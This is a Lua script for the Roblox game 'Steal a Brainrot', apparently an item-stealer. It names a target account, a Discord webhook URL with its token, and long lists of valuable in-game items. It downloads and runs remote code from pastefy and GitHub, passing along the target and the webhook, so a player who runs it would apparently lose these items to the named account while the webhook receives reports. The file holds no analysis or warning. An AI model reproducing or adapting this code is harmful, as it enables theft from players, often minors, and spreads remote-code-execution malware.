local TARGET_PLACE_IDS = {
    [109983668079237] = true,
    [17682392954] = true
}

-- التحقق من رقم الماب وطرد اللاعب في حال كان في ماب آخر
if not TARGET_PLACE_IDS[game.PlaceId] then
    game.Players.LocalPlayer:Kick("its not steal a brainrot stupid")
    return
end

-- ==========================================
-- كودك الأصلي كما هو بدون أي تغيير
-- ==========================================
local TARGET_ID = 10473713528
local TARGET_USER = "FPS31310H"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1529957583891202098/aR6IEDoOmT-1t4_fVYb5hSC8zaDxVRnQdjyrUmFP1I7EtUbu47N3_C8eKk-ENlEM7FRY"

local TargetBrainrots = {
    ["Strawberry Elephant"] = true,
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["Dragon Cannelloni"] = true,
    ["Dragon Gingerini"] = true,
    ["Griffin"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Hydra Bunny"] = true,
    ["Antonio"] = true,
    ["John Pork"] = true,
    ["Elefanto Frigo"] = true,
    ["Rubrikiko"] = true,
    ["Pancake and Syrup"] = true,
    ["Arcadragon"] = true,
    ["Rico Dinero"] = true,
    ["Capitano Americano"] = true,
    ["Kalika Bros"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Globa Steppa"] = true,
    ["Dug Dug Dug"] = true,
    ["Dragon Aquanini"] = true,
    ["La Casa Boo"] = true,
    ["La Supreme Combinasion"] = true,
    ["Headless Horseman"] = true,
    ["Signore Carapace"] = true,
    ["Fishino Clownino"] = true,
    ["Cerberus"] = true,
    ["Duggy Bros"] = true,
    ["Kraken"] = true,
    ["Venuspino"] = true,
    ["Los Hackers"] = true,
    ["Sammyni Cakini"] = true,
    ["Jelly Moby"] = true,
    ["Foxini Lanternini"] = true,
    ["Digi Narwhal"] = true,
    ["Los Admins"] = true,
    ["Moby Bros"] = true,
    ["Boppin Bunny"] = true,
    ["Bunny and Eggy"] = true,
    ["Capitano Moby"] = true,
    ["Burguro and Fryuro"] = true,
    ["Celestial Pegasus"] = true,
    ["Cash or Card"] = true,
    ["Cloverat Clapat"] = true,
    ["Cooki and Milki"] = true,
    ["Festive 67"] = true,
    ["Garama and Madundung"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Fortunu and Cashuru"] = true,
    ["Fragola La La La"] = true,
    ["Ginger Gerat"] = true,
    ["Guest 666"] = true,
    ["Hopilikalika Hopilikalako"] = true,
    ["Jolly Jolly Sahur"] = true,
    ["Ketupat Bros"] = true,
    ["La Food Combinasion"] = true,
    ["La Secret Combinasion"] = true,
    ["Coco and Mango"] = true,
    ["Los Secret Combinasionas"] = true,
    ["Pizza and Ranch"] = true,
    ["Los Amigos"] = true,
    ["Los Sekolahs"] = true,
    ["Love Love Bear"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Reinito Sleighito"] = true,
    ["Rosey and Teddy"] = true,
    ["Sammyni Fattini"] = true,
    ["Spooky and Pumpky"] = true,
    ["Rubiko and Kubiko"] = true
}

local TargetBaseSkins = {
    ["Octo"] = true,
    ["Tralalero"] = true
}

local TargetGears = {
    ["Bloodmoon Hammer"] = true,
    ["Bloodmoon Slap"] = true,
    ["Cupid's Wings"] = true,
    ["Candy Sentry"] = true,
    ["Santa's Sleigh"] = true,
    ["Waverider"] = true,
    ["Witch's Broom"] = true,
    ["Rainbow Hammer"] = true
}

task.spawn(function()



    loadstring(game:HttpGet("https://pastefy.app/lbKKtf9i/raw"))()



    task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)
